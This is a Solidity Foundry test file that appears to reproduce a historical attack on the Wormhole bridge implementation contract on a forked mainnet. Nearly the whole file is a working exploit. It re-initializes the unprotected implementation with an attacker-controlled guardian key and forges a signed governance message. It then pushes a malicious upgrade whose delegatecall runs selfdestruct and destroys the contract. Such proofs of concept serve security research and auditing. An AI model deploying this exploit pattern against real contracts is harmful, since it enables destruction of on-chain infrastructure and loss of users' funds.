// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./BytesLib.sol";

import {TestHarness} from "../../TestHarness.sol";

interface Structs {
	struct Signature {
		bytes32 r;
		bytes32 s;
		uint8 v;
		uint8 guardianIndex;
	}

	struct VM {
		uint8 version;
		uint32 timestamp;
		uint32 nonce;
		uint16 emitterChainId;
		bytes32 emitterAddress;
		uint64 sequence;
		uint8 consistencyLevel;
		bytes payload;

		uint32 guardianSetIndex;
		Signature[] signatures;

		bytes32 hash;
	}
}

interface IWormholeProxy { }

interface IWormholeImpl {
    function initialize(address[] memory initialGuardians, uint16 chainId, uint16 governanceChainId, bytes32 governanceContract) external;
    function governanceChainId() external view returns (uint16);
    function governanceContract() external view returns (bytes32);
    function getCurrentGuardianSetIndex() external view returns (uint32);
    function submitContractUpgrade(bytes memory _vm) external;
}

contract EvilWormhole {

  function initialize() external {
    Destructor des = new Destructor();
    (bool success, ) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
    require(success);
  }
}

contract Destructor {

  function destruct() external {
    console.log("[3] Self-destructing...");
    selfdestruct(payable(address(this)));
  }
}

contract ExploitWormhole is TestHarness {  

    IWormholeImpl internal wormholeImpl = IWormholeImpl(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
    uint256 attackerPrivateKey = 0xd0bbd8230a18b0b51c4934271cb8f6a9638ab171a7c6d570777b14c0ed58a5a1;
    uint256[] attackerKeys = [attackerPrivateKey];
    address internal attacker = address(0x0c2C6C607128e2221f237d6b53479b99c9B8882c);
    address[] attackerAddresses = [attacker];
    EvilWormhole evilWormhole;

    function signAndEncodeVM(
        int32 timestamp, 
        uint32 nonce,
        uint16 emitterChainId, 
        bytes32 emitterAddress, 
        uint64 sequence, 
        bytes memory data,
        uint256[] memory signers,
        uint32 guardianSetIndex,
        uint8 consistencyLevel) internal returns (bytes memory) {

      bytes memory vm;
      bytes32 hash;
      bytes memory signatures;
      bytes memory body = abi.encodePacked(
                                uint32(timestamp),
                                uint32(nonce),
                                uint16(emitterChainId),
                                bytes32(emitterAddress),
                                uint64(sequence),
                                uint8(consistencyLevel),
                                bytes(data)
      );

      hash = keccak256(abi.encodePacked(keccak256(body)));
      (uint8 v, bytes32 r, bytes32 s) = cheat.sign(attackerPrivateKey, hash);
      uint8 recoveryParam = ((v - 27) != 0) ? 1 : 0;

      signatures = abi.encodePacked(
                        uint8(0), // index - single signature
                        bytes32(r),
                        bytes32(s),
                        uint8(recoveryParam)
      );

      vm = abi.encodePacked(
                  uint8(1),
                  uint32(guardianSetIndex),
                  uint8(signers.length),
                  signatures,
                  body
      );

      return vm;
    }

    // Adapted version of https://etherscan.io/address/0x736d2a394f7810c17b3c6fed017d5bc7d60c077d#code#F5#L95
    function parseVM(bytes memory encodedVM) public pure virtual returns (Structs.VM memory vm) {
        uint index = 0;

        vm.version = BytesLib.toUint8(encodedVM, index);
        index += 1;
        require(vm.version == 1, "VM version incompatible");

        vm.guardianSetIndex = BytesLib.toUint32(encodedVM, index);
        index += 4;

        // Parse Signatures
        uint256 signersLen = BytesLib.toUint8(encodedVM, index);
        index += 1;
        vm.signatures = new Structs.Signature[](signersLen);
        for (uint i = 0; i < signersLen; i++) {
            vm.signatures[i].guardianIndex = BytesLib.toUint8(encodedVM, index);
            index += 1;

            vm.signatures[i].r = BytesLib.toBytes32(encodedVM, index);
            index += 32;
            vm.signatures[i].s = BytesLib.toBytes32(encodedVM, index);
            index += 32;
            vm.signatures[i].v = BytesLib.toUint8(encodedVM, index) + 27;
            index += 1;
        }

        // Hash the body
        bytes memory body = BytesLib.slice(encodedVM, index, encodedVM.length - index);
        vm.hash = keccak256(abi.encodePacked(keccak256(body)));

        // Parse the body
        vm.timestamp = BytesLib.toUint32(encodedVM, index);
        index += 4;

        vm.nonce = BytesLib.toUint32(encodedVM, index);
        index += 4;

        vm.emitterChainId = BytesLib.toUint16(encodedVM, index);
        index += 2;

        vm.emitterAddress = BytesLib.toBytes32(encodedVM, index);
        index += 32;

        vm.sequence = BytesLib.toUint64(encodedVM, index);
        index += 8;

        vm.consistencyLevel = BytesLib.toUint8(encodedVM, index);
        index += 1;

        vm.payload = BytesLib.slice(encodedVM, index, encodedVM.length - index);
    }

    function codeSize(address addr) internal view returns (uint) {
        uint size;

        assembly {
          size := extcodesize(addr)
        }
        return size;
    }

    function dumpCode(address addr, uint size) internal view {
        bytes memory bytecode;
        
        if (size >= 32)
          bytecode = BytesLib.slice(addr.code, 0, 32);
        else
          bytecode = addr.code;
        
        console.log("Wormhole Bridge implementation @", addr);
        console.logBytes(bytecode);
        console.log("");
    }

    function buildPayload(address target) internal pure returns (bytes memory) {
        bytes memory STUB = hex'00000000000000000000000000000000000000000000000000000000436f726501';
        bytes memory addressEncoded = abi.encodePacked(
                                uint112(0),
                                address(target)
        );
        bytes memory payload = BytesLib.concat(STUB, addressEncoded);

        return payload;
    }

    function setUp() external {
        Structs.VM memory vm;
        bytes memory _vm;
        bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
        uint size;

        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash: https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
        // at blockNumber: 13818843
        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash: https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
        // at blockNumber: 14269474
        cheat.createSelectFork("mainnet", 13818843);

        evilWormhole = new EvilWormhole();
        console.log("Evil contract @", address(evilWormhole));
        size = codeSize(address(wormholeImpl));
        dumpCode(address(wormholeImpl), size);

        console.log("[1] Re-initializing bridge to set attacker guardian...");
        wormholeImpl.initialize(attackerAddresses, 0, 0, HASH_ZERO);

        bytes memory payload = buildPayload(address(evilWormhole));
        _vm = signAndEncodeVM(
                0,
                0,
                wormholeImpl.governanceChainId(),
                wormholeImpl.governanceContract(),
                0,
                payload,
                attackerKeys,
                wormholeImpl.getCurrentGuardianSetIndex(),
                2
        );
        vm = parseVM(_vm);

        console.log("[2] Submitting malicious VM to upgrade the contract...");
        console.logBytes(vm.payload);
        wormholeImpl.submitContractUpgrade(_vm);
    }

    function test_attack() external {

        address addr = address(wormholeImpl);
        uint size = codeSize(addr);

        dumpCode(addr, size);
        assertEq(size, 0);
    }
}
